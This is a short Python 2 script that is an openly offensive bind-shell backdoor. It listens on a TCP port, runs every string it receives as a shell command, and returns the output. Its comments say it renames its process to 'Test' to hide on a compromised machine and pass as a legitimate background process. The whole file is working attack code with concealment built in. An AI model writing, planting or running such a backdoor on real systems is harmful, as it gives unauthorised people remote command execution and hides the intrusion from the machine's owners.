import socket
import subprocess
import setproctitle
#Change process name so that we can hide this program on a compromised machine
#Make it look like a legitimate process running in the background
title = "Test"
setproctitle.setproctitle(title)

HOST ="127.0.0.1"
PORT =8506

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s = setsockopt(socket,SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()

print "Connected with " + addr[0] + ':' + str(addr[1])

while True:

	data = conn.recv(1024)
	if data == "quit":
		conn.send(data)
		break
	else:
		command = data
		process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	
		output = process.stdout.read() + process.stderr.read()

		reply = output
		conn.sendall(reply)
